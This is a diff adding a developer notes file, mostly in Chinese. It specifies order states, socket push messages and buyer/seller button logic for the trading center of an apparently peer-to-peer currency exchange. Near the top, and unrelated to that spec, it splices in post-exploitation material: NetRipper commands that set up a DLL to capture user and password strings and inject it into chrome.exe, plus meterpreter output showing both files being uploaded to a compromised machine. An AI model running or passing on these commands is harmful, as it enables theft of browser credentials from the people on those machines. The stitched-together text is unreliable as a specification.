@@ -1,0 +1,62 @@
+-订单状态：0 待付款，1 已付款，2 已完成，3 取消
+
+
+NetRipper.x64.exe –w DLL.x64.dll –l TEMP –p true –d 4096 –s user,pass
+
+NetRipper.x64.exe ConfiguredDLL.dll chrome.exe 
+
+meterpreter > upload /root/NetRipper/x64/DLL.x64.dll
+[*] uploading  : /root/NetRipper/x64/DLL.x64.dll -> DLL.x64.dll
+[*] uploaded   : /root/NetRipper/x64/DLL.x64.dll -> DLL.x64.dll
+meterpreter > upload /root/NetRipper/x64/NetRipper.x64.exe
+[*] uploading  : /root/NetRipper/x64/NetRipper.x64.exe -> NetRipper.x64.exe
+[*] uploaded   : /root/NetRipper/x64/NetRipper.x64.exe -> NetRipper.x64.exe
+
+
+订单详情页-聊天窗---推送消息
+name: msg
+content: 
+	id	消息id
+	user_id	用户id
+	nickname	用户昵称
+	content	消息内容
+	create_time	消息创建时间
+
+交易中心-订单详情页-买家-我已付款---推送消息
+name：pay_status
+content：
+	order_id	订单id
+	order_status	订单状态
+	order_status_str	订单状态描述	
+
+交易中心-买货币
+交易中心-卖货币
+交易中心-订单详情页-买家-取消交易
+交易中心-订单详情页-卖家-划币
+	---推送未完成订单数量
+name：undone_order
+content：
+	count	未完成订单数量
+
+
+
+
+
+
+-按钮状态逻辑梳理
+（--表示界面显示按钮， => 表示进行操作过后的表现）
+订单状态 = 0（待付款）：初始订单
+买 -- 我已付款、取消交易；
+	买点击我已付款 => 订单状态 = 1（已付款）：
+		买 -- 取消交易、申诉，
+			买点击取消交易 => 同取消交易
+			买家点击申诉 => 同申诉
+		卖 -- 放行
+			买家点击放行 => 订单状态 = 2（已完成）
+	买点击取消交易 => 订单状态 = 3（取消）
+		买 -- 我已付款（灰色）、申诉，
+			买家点击申诉 => 同申诉
+		卖 -- 我已收款（灰色）、申诉
+			卖家点击申诉 => 是否申诉 = 是，订单状态不变，申诉结果通过socket推送是胜诉还是败诉
+卖 -- 等待对方支付中
+
